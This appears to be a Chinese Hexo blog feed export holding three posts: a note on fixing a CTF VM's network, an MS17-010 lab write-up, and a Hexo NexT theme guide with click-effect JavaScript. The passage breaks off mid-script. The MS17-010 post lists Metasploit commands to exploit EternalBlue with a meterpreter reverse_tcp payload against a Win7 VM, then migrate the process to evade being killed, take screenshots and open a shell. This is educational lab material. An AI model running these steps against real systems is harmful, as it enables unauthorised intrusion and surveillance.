id="靶机网络不通"><a href="#靶机网络不通" class="headerlink" title="靶机网络不通"></a>靶机网络不通</h2><p>一开始使用nmap扫描，扫不到。</p><p>去查了下，发现靶机的网络没起来。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.1.jpg"></p><p>在这个界面按下e键，进入设置界面。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.2.jpg"></p><p>把ro 修改为<strong>rw signie init&#x3D;&#x2F;bin&#x2F;bash</strong>。</p><p>按下ctrl+x。</p><p>使用<strong>ip a</strong>查看网卡信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.5.jpg"></p><p><strong>vim &#x2F;etc&#x2F;network&#x2F;interfaces</strong>，发现网卡有误，修改为实际网卡。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.3.jpg"></p><p>使用 <strong>&#x2F;etc&#x2F;init.d&#x2F;networking restart</strong> 重启服务</p><p>再去扫描，就发现正常了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/asstart/article/details/103433065">https://blog.csdn.net/asstart/article/details/103433065</a></p><p><a href="https://blog.csdn.net/qq_34953789/article/details/79973735">https://blog.csdn.net/qq_34953789/article/details/79973735</a></p><p><a href="https://www.cnblogs.com/panweishadow/p/3703729.html">https://www.cnblogs.com/panweishadow/p/3703729.html</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>靶机</tag>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms17-010实验</title>
    <link href="/2019/12/01/old/ms17-010%E5%AE%9E%E9%AA%8C(%E6%94%B9)/"/>
    <url>/2019/12/01/old/ms17-010%E5%AE%9E%E9%AA%8C(%E6%94%B9)/</url>
    
    <content type="html"><![CDATA[<p>ps：修改了一些错误，添加了一些内容</p><h1 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.     实验目的"></a>1.     实验目的</h1><p>利用ms17-010漏洞获得靶机（一个存在漏洞的系统）权限。</p><h1 id="2-实验原理"><a href="#2-实验原理" class="headerlink" title="2.     实验原理"></a>2.     实验原理</h1><p>利用了微软 Microsoft Windows SMB 服务器通信协议。</p><p>SMB主要用来使得一个网络上的机器共享计算机文件、打印机、串行端口和通讯等资源。它也提供认证的行程间通讯机能。使用<strong>445</strong>端口。</p><p>攻击者利用445端口发送特殊设计的消息，来远程执行攻击代码。</p><span id="more"></span><h1 id="3-准备"><a href="#3-准备" class="headerlink" title="3.     准备"></a>3.     准备</h1><p>一台靶机（win7），一台攻击机（kali）</p><h1 id="4-过程"><a href="#4-过程" class="headerlink" title="4.     过程"></a>4.     过程</h1><h2 id="1-设置扫描ip"><a href="#1-设置扫描ip" class="headerlink" title="1.     设置扫描ip"></a>1.     设置扫描ip</h2><p>先推算ip，设置攻击机和靶机在同一网段。</p><p>Kali机设置（有两种方法）：</p><p>①    vim &#x2F;etc&#x2F;network&#x2F;interfaces</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/clip_image001.jpg" alt="img"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.1.jpg"></p><p>更改完后记得重启网卡。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.2.jpg"></p><p>②    ip addr add 你的ip地址&#x2F;24 dev eth0</p><p>使用<strong>nmap扫描</strong>网段内存活的主机：</p><p>nmap -sP + 网段</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.3.jpg"></p><p> 扫描到两台机子，一台是我们的攻击机，133是我们的win7靶机。</p><h2 id="2-使用msf攻击"><a href="#2-使用msf攻击" class="headerlink" title="2.     使用msf攻击"></a>2.     使用msf攻击</h2><p>启动msf：<code>msfconsole</code></p><p>（ps：会出现的图像随机，不影响操作）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.4.jpg" alt="img"></p><p>查找ms17-010模块：<code>search ms17-010</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.5.jpg" alt="img"></p><p>使用use调用模块测试：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/clip_image012.jpg" alt="img"></p><p>设置检测对象：<code>set rhosts 192.168.1.133</code>（刚才扫描出的靶机ip，这里用133做试验）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.6.jpg"></p><p>查看配置信息：<code>show options</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.7.jpg"></p><p>可以看到，rhost已经设置成功。</p><p>这时候可以运行了，使用<strong>run</strong>或者<strong>exploit</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.8.jpg" alt="img"></p><p>上面写着’host is likely vulnerable to ms17-010’，表示这台靶机可利用ms17-010漏洞攻击。</p><p>现在调用攻击模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.10.jpg"></p><p>后面的操作还是一样设置rhost。不过这次要设置<strong>lhost</strong>(就是你攻击机的ip地址)和<strong>payload</strong>。</p><p>使用show options查看设置。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.1.133</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.1.24</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp<br>show <span class="hljs-keyword">options</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.9.jpg" alt="img"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.11.jpg"></p><h1 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h1><h2 id="1-进程迁移"><a href="#1-进程迁移" class="headerlink" title="1.进程迁移"></a>1.进程迁移</h2><p>现在的shell非常脆弱，很容易被杀死，所以要把进程迁移，和一个稳定的进程绑在一起，防止被查杀。</p><p>1.ps: 获取当前进程（sploove.exe就是打印机的相关进程）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.12.jpg"></p><p>2.getpid: 查看meterpreter shell进程号</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.13.jpg"></p><p>3.migrate + 稳定的进程号：进程迁移</p><p>使用后再查就会发现shell被迁移到了更稳定的进程上</p><p>4.run post&#x2F;windows&#x2F;manage&#x2F;migrate ：自动进行进程迁移（系统自己寻找合适进程）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.14.jpg"></p><h2 id="2-系统命令"><a href="#2-系统命令" class="headerlink" title="2.系统命令"></a>2.系统命令</h2><p>查看系统信息：sysinfo</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.15.jpg"></p><p>查看目标是否在虚拟机上：run post&#x2F;windows&#x2F;gather&#x2F;checkvm</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.16.jpg"></p><p>(显示确实在虚拟机)</p><p>抓取屏幕截图：1.输入load espia加载插件   2.截图：screengrab（或者screenshot）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.18.jpg"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.17.jpg"></p><p>可以看见存在了root用户下。</p><p>获得shell：shell命令进入，exit退出。</p><h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h1><p><a href="http://ourjs.com/detail/59172166f12390061496168f">http://ourjs.com/detail/59172166f12390061496168f</a><br><a href="https://blog.csdn.net/qq_37053007/article/details/88327077">https://blog.csdn.net/qq_37053007/article/details/88327077</a><br><a href="https://blog.csdn.net/qq_36197704/article/details/82458557">https://blog.csdn.net/qq_36197704/article/details/82458557</a></p><p><a href="https://blog.csdn.net/qq_41880069/article/details/82908293">https://blog.csdn.net/qq_41880069/article/details/82908293</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>旧文章</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo next主题美化</title>
    <link href="/2019/08/17/old/hexo%20next%E4%B8%BB%E9%A2%98%E7%BE%8E/"/>
    <url>/2019/08/17/old/hexo%20next%E4%B8%BB%E9%A2%98%E7%BE%8E/</url>
    
    <content type="html"><![CDATA[<p>本来建立博客的目的是为了督促自己学习的，没想到一下子爱上了主题美化（我真是没救了【捂脸】），故整理一份文档出来吧。</p><p>关于next的基础设置，可以参考<a href="http://theme-next.iissnan.com/getting-started.html">官方文档</a>，基本就是对_config.yml文件的修改，这里就不多赘述。</p><h1 id="一、鼠标点击效果"><a href="#一、鼠标点击效果" class="headerlink" title="一、鼠标点击效果"></a>一、鼠标点击效果</h1><p>按照喜好添加点击效果吧。</p><h2 id="1-爱心效果"><a href="#1-爱心效果" class="headerlink" title="1.爱心效果"></a>1.爱心效果</h2><span id="more"></span><p><img src="https://i.loli.net/2019/08/08/dciE8sp74X2e6un.jpg" alt="screenshot.3.jpg"></p><p><strong>\themes\next\source\js</strong>文件下创建一个<strong>love.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">!<span class="hljs-keyword">function</span>(<span class="hljs-params">e,t,a</span>)&#123;<span class="hljs-keyword">function</span> <span class="hljs-title function_">n</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-title function_">c</span>(<span class="hljs-string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),<span class="hljs-title function_">o</span>(),<span class="hljs-title function_">r</span>()&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> e=<span class="hljs-number">0</span>;e&lt;d.<span class="hljs-property">length</span>;e++)d[e].<span class="hljs-property">alpha</span>&lt;=<span class="hljs-number">0</span>?(t.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(d[e].<span class="hljs-property">el</span>),d.<span class="hljs-title function_">splice</span>(e,<span class="hljs-number">1</span>)):(d[e].<span class="hljs-property">y</span>--,d[e].<span class="hljs-property">scale</span>+=<span class="hljs-number">.004</span>,d[e].<span class="hljs-property">alpha</span>-=<span class="hljs-number">.013</span>,d[e].<span class="hljs-property">el</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span>=<span class="hljs-string">&quot;left:&quot;</span>+d[e].<span class="hljs-property">x</span>+<span class="hljs-string">&quot;px;top:&quot;</span>+d[e].<span class="hljs-property">y</span>+<span class="hljs-string">&quot;px;opacity:&quot;</span>+d[e].<span class="hljs-property">alpha</span>+<span class="hljs-string">&quot;;transform:scale(&quot;</span>+d[e].<span class="hljs-property">scale</span>+<span class="hljs-string">&quot;,&quot;</span>+d[e].<span class="hljs-property">scale</span>+<span class="hljs-string">&quot;) rotate(45deg);background:&quot;</span>+d[e].<span class="hljs-property">color</span>+<span class="hljs-string">&quot;;z-index:99999&quot;</span>);<span class="hljs-title function_">requestAnimationFrame</span>(r)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">o</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;function&quot;</span>==<span class="hljs-keyword">typeof</span> e.<span class="hljs-property">onclick</span>&amp;&amp;e.<span class="hljs-property">onclick</span>;e.<span class="hljs-property">onclick</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;t&amp;&amp;<span class="hljs-title function_">t</span>(),<span class="hljs-title function_">i</span>(e)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">i</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> a=t.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);a.<span class="hljs-property">className</span>=<span class="hljs-string">&quot;heart&quot;</span>,d.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">el</span>:a,<span class="hljs-attr">x</span>:e.<span class="hljs-property">clientX</span>-<span class="hljs-number">5</span>,<span class="hljs-attr">y</span>:e.<span class="hljs-property">clientY</span>-<span class="hljs-number">5</span>,<span class="hljs-attr">scale</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">alpha</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">color</span>:<span class="hljs-title function_">s</span>()&#125;),t.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> a=t.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;style&quot;</span>);a.<span class="hljs-property">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>;<span class="hljs-keyword">try</span>&#123;a.<span class="hljs-title function_">appendChild</span>(t.<span class="hljs-title function_">createTextNode</span>(e))&#125;<span class="hljs-keyword">catch</span>(t)&#123;a.<span class="hljs-property">styleSheet</span>.<span class="hljs-property">cssText</span>=e&#125;t.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;head&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">s</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&quot;rgb(&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;,&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;,&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;)&quot;</span>&#125;<span class="hljs-keyword">var</span> d=[];e.<span class="hljs-property">requestAnimationFrame</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">requestAnimationFrame</span>||e.<span class="hljs-property">webkitRequestAnimationFrame</span>||e.<span class="hljs-property">mozRequestAnimationFrame</span>||e.<span class="hljs-property">oRequestAnimationFrame</span>||e.<span class="hljs-property">msRequestAnimationFrame</span>||<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-built_in">setTimeout</span>(e,<span class="hljs-number">1e3</span>/<span class="hljs-number">60</span>)&#125;&#125;(),<span class="hljs-title function_">n</span>()&#125;(<span class="hljs-variable language_">window</span>,<span class="hljs-variable language_">document</span>);<br></code></pre></td></tr></table></figure><p>然后在<strong>\themes\next\layout</strong>的**_layout.swig**文件的末尾添加。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/love.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-字体效果"><a href="#2-字体效果" class="headerlink" title="2.字体效果"></a>2.字体效果</h2><p>点击出现字体，和出现爱心的方式差不多。</p><p>先创建一个<strong>click_show_text.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a_idx = <span class="hljs-number">0</span>;<br><span class="hljs-title function_">jQuery</span>(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">ready</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">$</span>) &#123;<br>    $(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span><br>        (<span class="hljs-string">&quot;富强&quot;</span>, <span class="hljs-string">&quot;民主&quot;</span>, <span class="hljs-string">&quot;文明&quot;</span>, <span class="hljs-string">&quot;和谐&quot;</span>, <span class="hljs-string">&quot;自由&quot;</span>, <span class="hljs-string">&quot;平等&quot;</span>, <span class="hljs-string">&quot;公正&quot;</span>, <span class="hljs-string">&quot;法治&quot;</span>, <span class="hljs-string">&quot;爱国&quot;</span>, <span class="hljs-string">&quot;敬业&quot;</span>, <span class="hljs-string">&quot;诚信&quot;</span>, <span class="hljs-string">&quot;友善&quot;</span>);<br>        <span class="hljs-keyword">var</span> $i = $(<span class="hljs-string">&quot;&lt;span/&gt;&quot;</span>).<span class="hljs-title function_">text</span>(a[a_idx]);<br>        a_idx = (a_idx + <span class="hljs-number">1</span>) % a.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">var</span> x = e.<span class="hljs-property">pageX</span>,<br>        y = e.<span class="hljs-property">pageY</span>;<br>        $i.<span class="hljs-title function_">css</span>(&#123;<br>            <span class="hljs-string">&quot;z-index&quot;</span>: <span class="hljs-number">5</span>,<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">20</span>,<br>            <span class="hljs-string">&quot;left&quot;</span>: x,<br>            <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-string">&quot;absolute&quot;</span>,<br>            <span class="hljs-string">&quot;font-weight&quot;</span>: <span class="hljs-string">&quot;bold&quot;</span>,<br>            <span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;#FF0000&quot;</span><br>        &#125;);<br>        $(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">append</span>($i);<br>        $i.<span class="hljs-title function_">animate</span>(&#123;<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">180</span>,<br>            <span class="hljs-string">&quot;opacity&quot;</span>: <span class="hljs-number">0</span><br>        &#125;,<br><span class="hljs-number">3000</span>,<br><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    $i.<span class="hljs-title function_">remove</span>();<br>&#125;);<br>    &#125;);<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&#x27;delay()&#x27;</span>, <span class="hljs-number">2000</span>);<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params"></span>) &#123;<br>    $(<span class="hljs-string">&quot;.buryit&quot;</span>).<span class="hljs-title function_">removeAttr</span>(<span class="hljs-string">&quot;onclick&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>字可替换成其他的字。</p><p>然后同样的，在_layout.swig文件的末尾加上一行代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--单击显示文字--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/click_show_text.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-烟花x爆炸效果"><a href="#3-烟花x爆炸效果" class="headerlink" title="3.烟花x爆炸效果"></a>3.烟花x爆炸效果</h2><p>和前两者方式相同，就只放代码不重复讲啦。</p><p>新建<strong>fireworks.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCoords</span>(<span class="hljs-params">e</span>)&#123;pointerX=(e.<span class="hljs-property">clientX</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span>)-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">left</span>,pointerY=e.<span class="hljs-property">clientY</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientY</span>-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">top</span>&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">setParticuleDirection</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> t=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">180</span>,a=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>][anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;<span class="hljs-attr">x</span>:e.<span class="hljs-property">x</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(t),<span class="hljs-attr">y</span>:e.<span class="hljs-property">y</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(t)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createParticule</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=colors[anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,colors.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)],a.<span class="hljs-property">radius</span>=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.<span class="hljs-property">endPos</span>=<span class="hljs-title function_">setParticuleDirection</span>(a),a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">fillStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">fill</span>()&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createCircle</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=<span class="hljs-string">&quot;#F00&quot;</span>,a.<span class="hljs-property">radius</span>=<span class="hljs-number">0.1</span>,a.<span class="hljs-property">alpha</span>=<span class="hljs-number">0.5</span>,a.<span class="hljs-property">lineWidth</span>=<span class="hljs-number">6</span>,a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-property">globalAlpha</span>=a.<span class="hljs-property">alpha</span>,ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">lineWidth</span>=a.<span class="hljs-property">lineWidth</span>,ctx.<span class="hljs-property">strokeStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">stroke</span>(),ctx.<span class="hljs-property">globalAlpha</span>=<span class="hljs-number">1</span>&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderParticule</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-number">0</span>;t&lt;e.<span class="hljs-property">animatables</span>.<span class="hljs-property">length</span>;t++)&#123;e.<span class="hljs-property">animatables</span>[t].<span class="hljs-property">target</span>.<span class="hljs-title function_">draw</span>()&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">animateParticules</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> a=<span class="hljs-title function_">createCircle</span>(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">createParticule</span>(e,t))&#125;anime.<span class="hljs-title function_">timeline</span>().<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:n,<span class="hljs-attr">x</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">x</span>&#125;,<span class="hljs-attr">y</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">y</span>&#125;,<span class="hljs-attr">radius</span>:<span class="hljs-number">0.1</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule&#125;).<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:a,<span class="hljs-attr">radius</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),<span class="hljs-attr">lineWidth</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">alpha</span>:&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;linear&quot;</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule,<span class="hljs-attr">offset</span>:<span class="hljs-number">0</span>&#125;)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a;<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> n=<span class="hljs-variable language_">this</span>,i=<span class="hljs-variable language_">arguments</span>;<span class="hljs-built_in">clearTimeout</span>(a),a=<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;e.<span class="hljs-title 